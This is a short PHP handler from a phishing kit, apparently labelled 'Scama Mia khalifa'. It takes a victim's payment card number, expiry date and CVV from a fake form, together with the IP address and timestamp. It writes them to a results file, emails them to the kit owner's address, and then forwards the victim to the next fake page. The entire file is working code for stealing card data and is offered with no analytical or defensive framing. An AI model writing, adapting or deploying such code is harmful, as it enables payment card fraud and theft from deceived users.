<?php

session_start();
include './email.php';

if(isset($_POST['number_cart'])){
	if(!empty($_POST['number_cart'])){

@$_SESSION['nn'] = $_POST['number_cart'];



$nc = $_POST['number_cart'];

$dc = $_POST['date_cart'];

$csc = $_POST['ccv_cart'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "New Scama Mia khalifa";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " CCV By Mia khalifa-  -  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "From: Mia khalifa" . "\r\n";

$message = "
Number Cart          =>   ".$nc."
Date Cart            =>   ".$dc."
ccv                  =>   ".$csc."
IP                   =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME                 =>    ".$time."
";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);

mail($yourmail, $subject, $message , $headers);

 header("location:../info.php?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");


 }else{
	header("Location: ../cart.php");
}}else{
	header("Location: ../cart.php");
}